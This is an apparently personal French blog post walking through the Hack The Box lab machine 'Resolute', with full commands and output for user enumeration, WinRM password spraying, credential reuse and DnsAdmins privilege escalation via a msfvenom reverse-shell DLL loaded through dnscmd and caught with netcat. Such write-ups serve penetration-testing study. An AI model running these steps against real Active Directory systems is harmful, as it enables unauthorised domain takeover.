<!DOCTYPE html>
<html lang="fr">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Resolute - Medium • LOLOLEKIK</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Resolute - Medium"/>
<meta name="twitter:description" content="Résolution de la box Resolute
Introduction La box Resolute de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.
Foothold Enumération Nmap sur la machine.
┌──(lololekik㉿Ashitaka)-[~] └─$ sudo nmap -p- -A resolute.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 16:19 CET Nmap scan report for resolute.htb (10.10.10.169) Host is up (0.032s latency). Not shown: 65514 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-01-28 15:27:17Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank."/>

<meta property="og:title" content="Resolute - Medium" />
<meta property="og:description" content="Résolution de la box Resolute
Introduction La box Resolute de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.
Foothold Enumération Nmap sur la machine.
┌──(lololekik㉿Ashitaka)-[~] └─$ sudo nmap -p- -A resolute.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 16:19 CET Nmap scan report for resolute.htb (10.10.10.169) Host is up (0.032s latency). Not shown: 65514 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-01-28 15:27:17Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://lololekik.com/hack-the-box/resolute/" />
<meta property="og:site_name" content="OffSec &amp; CO" />


    



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">







<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">


<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">


    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/custom.css">





</head>


    <body class=" ">
    
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      <span class="site__title">
        <a href="http://lololekik.com/">LOLOLEKIK</a>
      </span>
      
        
        
        
        <div class="author-image">
          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
        </div>
        
      
      
      <p class="site__description">
         OffSec &amp; Co 
      </p>
    </div>
    <div class="collapsible-menu">
      <input type="checkbox" id="menuToggle">
      <label for="menuToggle">LOLOLEKIK</label>
      <div class="menu-content">
        <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/cuisine/">
						<span>Cuisine</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/exploit/">
						<span>Exploit</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/network/">
						<span>Network</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/writeups/">
						<span>WriteUps</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/hack-the-box/">
						<span>HackTheBox</span>
					</a>
				</li>
			 
		
	</ul>
</div>

        <section class="social">
	
	
	
	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
	
	
	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
	
	
	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	
	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
	
</section>

      </div>
    </div>
    

<div class="builtwith">
Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
</div>


  </div>
</div>

        <div class="content container">
            
    
<article>
  <header>
    <h1>Resolute - Medium</h1>
    
    
<div class="post__meta">
    
    
    
    
      
      
          in
          
          
              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
              
          
      
    
    
    
      
      
          <br/>
           <i class="fas fa-tags"></i>
          
          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
           
      
          <a class="badge badge-tag" href="/tags/windows">windows</a>
           
      
          <a class="badge badge-tag" href="/tags/medium">medium</a>
           
      
          <a class="badge badge-tag" href="/tags/winrm">winrm</a>
           
      
          <a class="badge badge-tag" href="/tags/dns">dns</a>
           
      
          <a class="badge badge-tag" href="/tags/smb">smb</a>
          
      
    
    
    <br/>
    <i class="fas fa-clock"></i> 9 min read
</div>


  </header>
  
  
  <div class="post">
    <p><strong>Résolution de la box Resolute</strong></p>
<h1 id="introduction">Introduction</h1>
<p>La box <strong>Resolute</strong> de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.</p>



  <img src="/img/htb/resolute/resolute.png" alt="Résumé de la machine Resolute" class="imageformat"/>

<h1 id="foothold">Foothold</h1>
<h2 id="enumération">Enumération</h2>
<p>Nmap sur la machine.</p>
<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~]
└─$ sudo nmap -p- -A resolute.htb            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 16:19 CET
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.032s latency).
Not shown: 65514 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-01-28 15:27:17Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/28%OT=53%CT=1%CU=44352%PV=Y%DS=2%DC=T%G=Y%TM=6012D67
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=
OS:A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m08s, median: 6m59s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-01-28T07:28:17-08:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-01-28T15:28:20
|_  start_date: 2021-01-28T15:26:14

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.66 ms 10.10.14.1
2   30.71 ms resolute.htb (10.10.10.169)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.70 seconds

</code></pre><p>On toruve plusieurs user avec enum4linux et le mot de passe de Marko.</p>
<pre><code class="language-"shell" data-lang=""shell"> ============================= 
|    Users on resolute.htb    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

</code></pre><h2 id="exploit">Exploit</h2>
<p>Comme le mot de passe ne fonctionne pas sur marco on regarde si un autre user peut l&rsquo;utiliser.</p>
<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/resolute]
└─$ sudo crackmapexec winrm -u user.txt -p Welcome123! -d Megabank.local resolute.htb
WINRM       10.10.10.169    5985   resolute.htb     [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\Administrator:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\ryan:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\marko:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\sunita:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\abigail:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\marcus:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\sally:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\fred:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\angela:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\felicia:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\gustavo:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\ulf:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\stevie:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\claire:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\paulo:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\steve:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\annette:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\annika:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\per:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [-] Megabank.local\claude:Welcome123!
WINRM       10.10.10.169    5985   resolute.htb     [+] Megabank.local\melanie:Welcome123! (Pwn3d!)
</code></pre><p>On se connecte donc avec Mélanie via evil-winrm.</p>
<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/tools/evil-winrm]
└─$ ./evil-winrm.rb -u melanie -p Welcome123! -i resolute.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents&gt; dir
*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\melanie&gt; dir


    Directory: C:\Users\melanie


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        12/4/2019   2:47 AM                Desktop
d-r---        12/4/2019   2:46 AM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\melanie&gt; cd Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; dir


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:33 AM             32 user.txt


*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; 
</code></pre><h1 id="user-2">User 2</h1>
<h2 id="enumération-1">Enumération</h2>
<p>On trouve un mot de passe dans un fichier cacher à la racine.</p>
<pre><code class="language-"shell" data-lang=""shell">**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS&gt;CommandInvocation(Out-String): &quot;Out-String&quot;
&gt;&gt; ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;The syntax of this command is:&quot;
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
</code></pre><h2 id="exploit-1">Exploit</h2>
<p>On se connecte avec evilwinrm</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/evil-winrm<span style="color:#f92672">]</span>
└─$ ./evil-winrm.rb -i resolute.htb -u ryan -p Serv3r4Admin4cc123!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; hostname
Resolute
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
megabank<span style="color:#ae81ff">\r</span>yan
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; 

</code></pre></div><h1 id="administrator">Administrator</h1>
<h2 id="enumeration">Enumeration</h2>
<p>On voit qu&rsquo;on fait partie du groupe DnsAdmin</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
<span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span> <span style="color:#f92672">===============================================================</span>
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK<span style="color:#ae81ff">\C</span>ontractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK<span style="color:#ae81ff">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span style="color:#ae81ff">\M</span>edium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; 

</code></pre></div><h2 id="exploit-2">Exploit</h2>
<p>On construit notre DLL, et on ouvre notre port 9876 en écoute.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/resolute<span style="color:#f92672">]</span>
└─$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.13 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9876</span> -f dll &gt; lololekik.dll                                                                                                                                          <span style="color:#ae81ff">2</span> ⨯
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: <span style="color:#ae81ff">324</span> bytes
Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
                                    
</code></pre></div><p>Ensuite on doit hoster notre dll pour que le service distant puisse l&rsquo;executer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/resolute<span style="color:#f92672">]</span>
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py lolo ./                                                                                                                                                         <span style="color:#ae81ff">2</span> ⨯
Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed

</code></pre></div><p>On fait pointer le service DNS sur notre DLL et on le redémarre.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; dnscmd 127.0.0.1 /config /serverlevelplugindll <span style="color:#ae81ff">\\</span>10.10.14.13<span style="color:#ae81ff">\l</span>olo<span style="color:#ae81ff">\l</span>ololekik.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS
        STATE              : <span style="color:#ae81ff">3</span>  STOP_PENDING
                                <span style="color:#f92672">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#f92672">)</span>
        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; sc.exe start dns

SERVICE_NAME: dns
        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS
        STATE              : <span style="color:#ae81ff">2</span>  START_PENDING
                                <span style="color:#f92672">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#f92672">)</span>
        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : <span style="color:#ae81ff">3980</span>
        FLAGS              :
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; 

</code></pre></div><p>Sur notre port nous sommes en admin sur la machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nc -nvlp <span style="color:#ae81ff">9876</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9876</span> ...

connect to <span style="color:#f92672">[</span>10.10.14.13<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.169<span style="color:#f92672">]</span> <span style="color:#ae81ff">53159</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami <span style="color:#f92672">&amp;&amp;</span> hostname
